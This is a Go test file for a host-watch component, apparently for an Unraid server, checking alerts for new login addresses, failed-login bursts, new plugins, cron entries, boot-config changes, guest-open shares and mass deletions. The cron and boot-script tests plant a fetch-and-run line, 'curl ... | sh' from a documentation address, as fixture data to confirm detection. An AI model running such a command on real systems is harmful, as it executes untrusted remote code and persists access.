package host

import (
	"fmt"
	"testing"
	"time"

	"github.com/junkerderprovinz/parleyport/kit/status"
)

func signIn(key, user, addr string) class {
	return class{Level: status.SeverityInfo, Key: key, Args: map[string]string{"user": user, "addr": addr}}
}

func keys(fs []finding) []string {
	out := []string{}
	for _, f := range fs {
		out = append(out, f.Key)
	}
	return out
}

func TestASignInFromANewAddressIsReportedOnce(t *testing.T) {
	w := newWatch(baseline{})
	if got := w.signIn(signIn("h_s_web_ok", "root", "192.0.2.20"), now, false); len(got) != 0 {
		t.Fatalf("the history taught nothing silently: %v", keys(got))
	}
	if got := w.signIn(signIn("h_s_ssh_ok", "root", "192.0.2.20"), now, true); len(got) != 0 {
		t.Errorf("a known address: %v", keys(got))
	}
	got := w.signIn(signIn("h_s_ssh_ok", "root", "198.51.100.9"), now, true)
	if len(got) != 1 || got[0].Key != "h_w_new_ssh" || got[0].Level != status.SeverityWarn || got[0].Args["addr"] != "198.51.100.9" || got[0].Args["user"] != "root" {
		t.Fatalf("%+v", got)
	}
	if again := w.signIn(signIn("h_s_web_ok", "root", "198.51.100.9"), now.Add(time.Minute), true); len(again) != 0 {
		t.Errorf("told twice: %v", keys(again))
	}
	if !w.knows("198.51.100.9") || w.knows("203.0.113.1") {
		t.Error("knows the wrong addresses")
	}
}

func TestABurstOfFailedSignInsIsReportedOncePerHour(t *testing.T) {
	w := newWatch(baseline{})
	fail := signIn("h_s_ssh_fail", "admin", "198.51.100.7")
	var got []finding
	for i := range 4 {
		got = append(got, w.signIn(fail, now.Add(time.Duration(i)*time.Minute), true)...)
	}
	if len(got) != 0 {
		t.Fatalf("four failures: %v", keys(got))
	}
	got = w.signIn(signIn("h_s_web_fail", "root", "198.51.100.7"), now.Add(5*time.Minute), true)
	if len(got) != 1 || got[0].Key != "h_w_fails" || got[0].Args["n"] != "5" || got[0].Args["addr"] != "198.51.100.7" {
		t.Fatalf("%+v", got)
	}
	for i := range 10 {
		if more := w.signIn(fail, now.Add(time.Duration(6+i)*time.Minute), true); len(more) != 0 {
			t.Fatalf("told again within the hour: %v", keys(more))
		}
	}
	for i := range 5 {
		got = w.signIn(fail, now.Add(2*time.Hour+time.Duration(i)*time.Second), true)
	}
	if len(got) != 1 {
		t.Errorf("a new burst an hour later: %v", keys(got))
	}
}

func TestFailuresSpreadOverAnHourAreNoBurst(t *testing.T) {
	w := newWatch(baseline{})
	for i := range 8 {
		if got := w.signIn(signIn("h_s_ssh_fail", "root", "198.51.100.7"), now.Add(time.Duration(i)*8*time.Minute), true); len(got) != 0 {
			t.Fatalf("failure %d: %v", i, keys(got))
		}
	}
}

func TestFailuresInTheHistoryAreNoBurst(t *testing.T) {
	w := newWatch(baseline{})
	for i := range 6 {
		if got := w.signIn(signIn("h_s_ssh_fail", "root", "198.51.100.7"), now.Add(time.Duration(i)*time.Second), false); len(got) != 0 {
			t.Fatalf("%v", keys(got))
		}
	}
}

func TestANewPluginIsReported(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/boot/config/plugins/tollroll.plg", "<PLUGIN/>")
	write(t, root, "/boot/config/plugins/dynamix.cfg", "")
	w := newWatch(baseline{})
	if got := w.plugins(readPlugins(root)); len(got) != 0 {
		t.Fatalf("first look: %v", keys(got))
	}
	write(t, root, "/boot/config/plugins/unassigned.devices.plg", "<PLUGIN/>")
	got := w.plugins(readPlugins(root))
	if len(got) != 1 || got[0].Key != "h_w_plugin" || got[0].Args["name"] != "unassigned.devices" || got[0].Level != status.SeverityWarn {
		t.Fatalf("%+v", got)
	}
	if again := w.plugins(readPlugins(root)); len(again) != 0 {
		t.Errorf("told twice: %v", keys(again))
	}
}

func TestANewCronEntryIsReported(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/etc/cron.d/root", "# Generated mover schedule:\n0 3 * * * /usr/local/sbin/mover &> /dev/null\n\n")
	write(t, root, "/var/spool/cron/crontabs/root", "# min hour\n47 */1 * * * /usr/bin/run-parts /etc/cron.hourly 1> /dev/null\n")
	w := newWatch(baseline{})
	if got := w.cron(readCron(root)); len(got) != 0 {
		t.Fatalf("first look: %v", keys(got))
	}
	write(t, root, "/etc/cron.d/backup", "*/5 * * * * root curl -s http://198.51.100.7/x | sh\n")
	got := w.cron(readCron(root))
	if len(got) != 1 || got[0].Key != "h_w_cron" || got[0].Args["task"] != "*/5 * * * * root curl -s http://198.51.100.7/x | sh" {
		t.Fatalf("%+v", got)
	}
	write(t, root, "/etc/cron.d/root", "# Generated mover schedule:\n0 3 * * * /usr/local/sbin/mover &> /dev/null\n")
	if again := w.cron(readCron(root)); len(again) != 0 {
		t.Errorf("an unchanged file again: %v", keys(again))
	}
}

func TestAChangedFlashConfigIsReportedWithTheFilesItTouched(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/boot/config/ident.cfg", "NAME=\"Tower\"\n")
	write(t, root, "/boot/config/go", "#!/bin/bash\n/usr/local/sbin/emhttp &\n")
	write(t, root, "/boot/config/shares/Media.cfg", "shareExport=\"-\"\n")
	write(t, root, "/boot/config/super.dat", "x")
	w := newWatch(baseline{})
	if got := w.flash(readFlash(root)); len(got) != 0 {
		t.Fatalf("first look: %v", keys(got))
	}
	write(t, root, "/boot/config/super.dat", "changes with every array start")
	if got := w.flash(readFlash(root)); len(got) != 0 {
		t.Fatalf("super.dat: %v", keys(got))
	}
	write(t, root, "/boot/config/ident.cfg", "NAME=\"Tower2\"\n")
	got := w.flash(readFlash(root))
	if len(got) != 1 || got[0].Key != "h_w_flash" || got[0].Args["files"] != "ident.cfg" || got[0].Level != status.SeverityInfo {
		t.Fatalf("%+v", got)
	}
	write(t, root, "/boot/config/go", "#!/bin/bash\n/usr/local/sbin/emhttp &\ncurl -s http://198.51.100.7/x | sh\n")
	write(t, root, "/boot/config/shares/Media.cfg", "shareExport=\"e\"\n")
	got = w.flash(readFlash(root))
	if len(got) != 1 || got[0].Args["files"] != "go, shares/Media.cfg" || got[0].Level != status.SeverityWarn {
		t.Fatalf("the go file: %+v", got)
	}
}

func TestAShareNewlyOpenToGuestsIsReported(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/boot/config/shares/Media.cfg", "shareExport=\"e\"\nshareSecurity=\"public\"\nshareExportNFS=\"-\"\nshareSecurityNFS=\"public\"\n")
	write(t, root, "/boot/config/shares/Docs.cfg", "shareExport=\"e\"\nshareSecurity=\"private\"\nshareExportNFS=\"-\"\nshareSecurityNFS=\"public\"\n")
	write(t, root, "/boot/config/shares/Hidden.cfg", "shareExport=\"-\"\nshareSecurity=\"public\"\n")
	if got := fmt.Sprint(readGuests(root)); got != "[Media:SMB]" {
		t.Errorf("open to guests: %s", got)
	}
	w := newWatch(baseline{})
	if got := w.guests(readGuests(root)); len(got) != 0 {
		t.Fatalf("first look: %v", keys(got))
	}
	write(t, root, "/boot/config/shares/Docs.cfg", "shareExport=\"eh\"\nshareSecurity=\"secure\"\nshareExportNFS=\"e\"\nshareSecurityNFS=\"public\"\n")
	got := w.guests(readGuests(root))
	if len(got) != 2 || got[0].Key != "h_w_guest" || got[0].Args["share"] != "Docs" || got[0].Args["proto"] != "NFS" || got[1].Args["proto"] != "SMB" {
		t.Fatalf("%+v", got)
	}
	if again := w.guests(readGuests(root)); len(again) != 0 {
		t.Errorf("told twice: %v", keys(again))
	}
}

func TestManyFilesDeletedAtOnceAreReported(t *testing.T) {
	w := newWatch(baseline{})
	if got := w.deletes(map[string]uint64{"disk1": 50000, "cache": 9000}, false); len(got) != 0 {
		t.Fatalf("first look: %v", keys(got))
	}
	if got := w.deletes(map[string]uint64{"disk1": 49900, "cache": 9100}, false); len(got) != 0 {
		t.Fatalf("a few: %v", keys(got))
	}
	got := w.deletes(map[string]uint64{"disk1": 47000, "cache": 9100}, false)
	if len(got) != 1 || got[0].Key != "h_w_deleted" || got[0].Args["disk"] != "Disk 1" || got[0].Args["n"] != "2900" {
		t.Fatalf("%+v", got)
	}
}

func TestTheMoverEmptyingTheCacheIsNoMassDelete(t *testing.T) {
	w := newWatch(baseline{})
	w.deletes(map[string]uint64{"cache": 90000}, false)
	if got := w.deletes(map[string]uint64{"cache": 10000}, true); len(got) != 0 {
		t.Errorf("%v", keys(got))
	}
}

func TestWhatWasLearnedSurvivesARestart(t *testing.T) {
	w := newWatch(baseline{})
	w.signIn(signIn("h_s_web_ok", "root", "192.0.2.20"), now, false)
	w.plugins([]string{"tollroll"})
	w2 := newWatch(w.base)
	if !w2.knows("192.0.2.20") {
		t.Error("forgot the address")
	}
	if got := w2.plugins([]string{"tollroll"}); len(got) != 0 {
		t.Errorf("a known plugin after a restart: %v", keys(got))
	}
}

func TestVarLogWarnsAtEightyAndNotifiesOnceAtNinety(t *testing.T) {
	var r room
	steps := []struct {
		pct              int
		note, tell, back bool
	}{
		{50, false, false, false},
		{81, true, false, false},
		{85, false, false, false},
		{91, false, true, false},
		{97, false, false, false},
		{88, false, false, false},
		{70, false, false, true},
		{60, false, false, false},
		{93, true, true, false},
	}
	for i, s := range steps {
		note, tell, back := r.step(s.pct)
		if note != s.note || tell != s.tell || back != s.back {
			t.Errorf("step %d at %d%%: note %v tell %v back %v", i, s.pct, note, tell, back)
		}
	}
}

func TestTheBiggestFileInVarLogIsFound(t *testing.T) {
	root := t.TempDir()
	write(t, root, "/var/log/syslog", "small\n")
	write(t, root, "/var/log/samba/log.smbd", string(make([]byte, 4096)))
	write(t, root, "/var/log/docker.log", string(make([]byte, 1024)))
	path, size := biggest(root, "/var/log")
	if path != "/var/log/samba/log.smbd" || size != 4096 {
		t.Errorf("%s %d", path, size)
	}
}

func TestTheWriterOfALogFileIsNamed(t *testing.T) {
	root := unraid(t)
	id := "cd" + strings64
	process(t, root, proc{pid: 8000, ppid: 1, comm: "nginx", cgroup: "0::/docker/" + id, fds: []string{"/var/log/nginx/error.log"}})
	write(t, root, "/var/lib/docker/containers/"+id+"/config.v2.json", `{"Name":"/Nginx"}`)
	process(t, root, proc{pid: 8100, ppid: 1, comm: "rsyslogd", cgroup: "0::/", fds: []string{"/var/log/syslog"}})
	p := probe{root: root}
	if got := p.writer("/var/log/nginx/error.log"); got != (cause{By: "container", Who: "Nginx"}) {
		t.Errorf("nginx: %+v", got)
	}
	if got := p.writer("/var/log/syslog"); got != (cause{By: "process", Who: "rsyslogd"}) {
		t.Errorf("syslog: %+v", got)
	}
	if got := p.writer("/var/log/old.log"); got != (cause{By: "unknown"}) {
		t.Errorf("nobody: %+v", got)
	}
}

const strings64 = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcd"
